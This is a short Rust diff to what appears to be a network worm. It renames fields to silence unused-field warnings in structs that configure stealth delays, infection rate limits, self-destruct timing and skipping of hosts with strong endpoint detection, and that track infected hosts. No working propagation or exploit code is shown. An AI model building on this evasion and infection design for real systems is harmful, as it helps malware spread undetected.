@@ -13,7 +13,7 @@ struct WormLimits {
     stealth_delay: Duration,    // Base delay between infection attempts
     max_infections_per_minute: u32, // Rate limiter
     self_destruct_after: Duration,  // Auto-terminate after this long
-    avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
+    _avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
 }
 
 impl Default for WormLimits {
@@ -28,7 +28,7 @@ impl Default for WormLimits {
             stealth_delay: Duration::from_secs(30),
             max_infections_per_minute: 2,
             self_destruct_after: Duration::from_secs(3600), // 1 hour
-            avoid_edr_threshold: 0.7,
+            _avoid_edr_threshold: 0.7,
         }
     }
 }
@@ -38,13 +38,14 @@ impl Default for WormLimits {
 struct InfectionState {
     host: String,
     success: bool,
-    timestamp: u64,
-    method: String,
-    edr_detected: bool,
+    _timestamp: u64,
+    _method: String,
+    _edr_detected: bool,
 }
 
 // ── Worm Agent ───────────────────────────────────────────────────────────────
 
+#[allow(dead_code)]
 struct WormAgent {
     comms: HiveChamber,
     identity: AgentIdentity,
@@ -221,9 +222,9 @@ impl WormAgent {
         let state = InfectionState {
             host: host.to_string(),
             success: result,
-            timestamp: ts,
-            method: method.to_string(),
-            edr_detected: false,
+            _timestamp: ts,
+            _method: method.to_string(),
+            _edr_detected: false,
         };
 
         if result {
